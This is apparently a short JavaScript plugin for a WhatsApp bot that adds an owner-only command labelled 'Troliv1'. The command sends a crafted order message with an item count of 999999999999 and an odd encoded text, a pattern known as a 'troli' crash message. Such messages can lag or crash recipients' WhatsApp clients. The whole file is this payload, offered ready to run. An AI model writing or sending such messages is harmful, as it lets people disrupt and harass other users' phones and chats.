let handler  = async (m, { conn, usedPrefix }) => {
prep = conn.prepareMessageFromContent(m.chat, { orderMessage: { 
itemCount: 999999999999, status: 1,
message: `AwogAwogAwog`,
orderTitle: 'B',
sellerJid: '0@s.whatsapp.net',
thumbnail: global.thumb
}}, {contextInfo: null, quoted: m})
conn.relayWAMessage(prep)
}



handler.help = ['Troliv1']

handler.tags = ['main']

handler.command = /^kode$/i
handler.owner = true


module.exports = handler
